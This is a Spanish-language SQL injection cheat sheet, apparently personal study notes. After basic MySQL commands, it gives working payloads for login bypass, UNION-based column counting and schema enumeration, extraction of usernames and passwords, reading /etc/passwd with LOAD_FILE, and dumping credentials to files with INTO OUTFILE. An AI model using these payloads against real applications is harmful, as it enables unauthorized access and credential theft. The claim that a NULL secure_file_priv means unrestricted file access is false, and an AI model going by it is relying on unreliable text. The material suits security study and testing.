# SQL - Inyecciones (SQLi)

## Conexión a Base de Datos

```bash
mysql -u root -h HOST -P PORT -p
```

---

## Operaciones Básicas

### Crear y gestionar bases de datos

```sql
-- Crear una nueva base de datos
CREATE DATABASE users;

-- Mostrar todas las bases de datos disponibles
SHOW DATABASES;

-- Seleccionar una base de datos para usar
USE users;
```

### Inspeccionar tablas

```sql
-- Listar todas las tablas en la base de datos actual
SHOW TABLES;

-- Mostrar estructura y columnas de una tabla
DESCRIBE tabla;
```

### Insertar datos

```sql
-- Ejemplo: insertar un nuevo usuario
INSERT INTO tabla VALUES('admin', 'password123', 2025);
```

### Consultar datos (SELECT)

```sql
-- Obtener todos los datos de una tabla
SELECT * FROM tabla;

-- Con ordenamiento
SELECT * FROM tabla ORDER BY campo ASC;      -- Ascendente
SELECT * FROM tabla ORDER BY campo DESC;     -- Descendente

-- Limitar resultados
SELECT * FROM tabla LIMIT 2;  -- Los 2 primeros registros

-- Con condiciones
SELECT * FROM tabla WHERE username = 'admin' AND password = 'pass';
SELECT * FROM tabla WHERE username = 'admin' OR id = 1;

-- Con búsqueda parcial
SELECT * FROM tabla WHERE username LIKE 'admin%';  -- Empieza con admin

-- Combinar resultados de múltiples tablas
SELECT * FROM usuarios UNION SELECT * FROM otratabla;  -- Mismo número de columnas
```

### Eliminar y modificar tablas

```sql
-- Eliminar tabla completa
DROP TABLE tabla;

-- Añadir una nueva columna
ALTER TABLE tabla ADD nuevacolumna INT;

-- Renombrar columna
ALTER TABLE tabla RENAME COLUMN antiguo TO nuevo;

-- Modificar tipo de dato
ALTER TABLE tabla MODIFY columna DATE;

-- Eliminar columna
ALTER TABLE tabla DROP columna;
```

---
				




## Inyecciones SQL (SQLi)

### 1. Bypass de Autenticación

#### Caracteres clave para inyecciones

| Carácter | URL Encoded | Uso |
| -------- | ----------- | --- |
| `'` | `%27` | Cerrar cadenas de texto |
| `"` | `%22` | Cerrar cadenas con comillas dobles |
| `#` | `%23` | Comentario (MySQL) |
| `;` | `%3B` | Separador de sentencias |
| `)` | `%29` | Cerrar paréntesis |

#### Ejemplos de Bypass

**Escenario:** Formulario de login vulnerable

```sql
-- Inyección básica con comilla simple
admin' or '1'='1
-- Resultado: Devuelve verdadero, accedemos como admin

-- Inyección con comentario
admin'-- 
-- Elimina el resto de la consulta (contraseña)

-- Inyección en campo de contraseña
' OR 1=1 --
```

**Consulta vulnerable original:**
```sql
SELECT * FROM users WHERE username='$username' AND password='$password';
```

**Después de la inyección:**
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything';
-- OR '1'='1' siempre es verdadero, bypasea la autenticación
```

---

### 2. Determinar el número de columnas

Es crucial saber cuántas columnas tiene la tabla destino para UNION injections.

#### Método 1: ORDER BY

```sql
-- Probar números secuencialmente hasta obtener error
1' ORDER BY 1-- -     -- Funciona (1 columna)
1' ORDER BY 2-- -     -- Funciona (2 columnas)
1' ORDER BY 3-- -     -- Funciona (3 columnas)
1' ORDER BY 4-- -     -- ERROR (solo hay 3 columnas)
```

#### Método 2: UNION SELECT

```sql
-- Probar diferentes números de columnas
1' UNION SELECT 1-- -         -- Error
1' UNION SELECT 1,2-- -       -- Error
1' UNION SELECT 1,2,3-- -     -- Éxito (tabla tiene 3 columnas)
```

#### Usando NULL para tipos desconocidos

Si necesitas forzar tipos de datos compatibles, usa NULL:

```sql
1' UNION SELECT NULL, NULL, NULL-- -
-- NULL se adapta a cualquier tipo de dato
```

---

### 3. Fingerprinting y Enumeración

#### Consultas de sistema

```sql
-- Ver usuario actual
SELECT USER();
SELECT CURRENT_USER();
SELECT user FROM mysql.user;

-- Ejemplo de resultado: root@localhost
```

#### Enumerar bases de datos

```sql
-- Listar todas las bases de datos
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

-- Con UNION injection (asumiendo 4 columnas):
1' UNION SELECT 1, SCHEMA_NAME, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

#### Enumerar tablas de una base de datos

```sql
-- Payload UNION con 4 columnas
1' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='nombredb'-- -

-- Resultado ejemplo:
-- users | nombredb
-- products | nombredb
-- orders | nombredb
```

#### Enumerar columnas de una tabla

```sql
-- Obtener todas las columnas de la tabla 'credentials'
1' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -

-- Resultado ejemplo:
-- id | credentials | nombredb
-- username | credentials | nombredb
-- password | credentials | nombredb
-- email | credentials | nombredb
```

#### Extraer datos finales

```sql
-- Una vez conocemos la estructura, extraer datos
1' UNION SELECT 1, username, password, 4 FROM nombredb.credentials-- -

-- Resultado ejemplo:
-- admin | admin123456
-- user | password789
-- root | secretpass
```

---

### 4. Información de Permisos y Privilegios

#### Verificar permisos del usuario

```sql
-- Ver tabla de permisos
SELECT super_priv FROM mysql.user WHERE user='root';

-- Resultado: Y (sí tiene permisos super) o N (no los tiene)

-- Permisos específicos del usuario
1' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

-- Resultado ejemplo:
-- 'root'@'localhost' | SELECT
-- 'root'@'localhost' | INSERT
-- 'root'@'localhost' | CREATE
-- 'root'@'localhost' | FILE
```

---

### 5. Lectura de Archivos del Sistema

Con privilegios FILE, podemos leer archivos del servidor.

```sql
-- Intentar leer /etc/passwd
SELECT LOAD_FILE('/etc/passwd');

-- Con UNION injection:
1' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -

-- Resultado ejemplo:
-- root:x:0:0:root:/root:/bin/bash
-- daemon:x:1:1:daemon:/usr/sbin:/nologin
-- bin:x:2:2:bin:/usr/bin:/nologin
```

#### Limitación: secure_file_priv

```sql
-- Verificar dónde se pueden leer/escribir archivos
SHOW VARIABLES LIKE 'secure_file_priv';

-- Alternativa:
SELECT variable_name, variable_value FROM information_schema.global_variables 
WHERE variable_name='secure_file_priv';

-- Resultados posibles:
-- NULL = sin restricciones (acceso total)
-- /var/lib/mysql/ = solo en ese directorio
-- (vacío) = acceso total al sistema
```

---

### 6. Escritura de Archivos

#### Exportar datos a archivo

```sql
-- Exportar tabla completa a archivo
SELECT * FROM credentials INTO OUTFILE '/tmp/credentials.txt';

-- Con formato específico
SELECT username, password INTO OUTFILE '/tmp/creds.csv' 
FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n' 
FROM credentials;

-- Resultado archivo:
-- admin,password123
-- user,pass789
-- root,secretkey
```

#### Manejo de datos largos con BASE64

Para cadenas muy largas, usa BASE64:

```sql
-- Ensocodar en base64
SELECT TO_BASE64(column_name) FROM table;

-- Decodicar después
SELECT FROM_BASE64('base64_data');

-- Ejemplo de inyección:
1' UNION SELECT 1, FROM_BASE64('cGFzc3dvcmQxMjM='), 3, 4-- -
-- Descodifica: password123
```

---
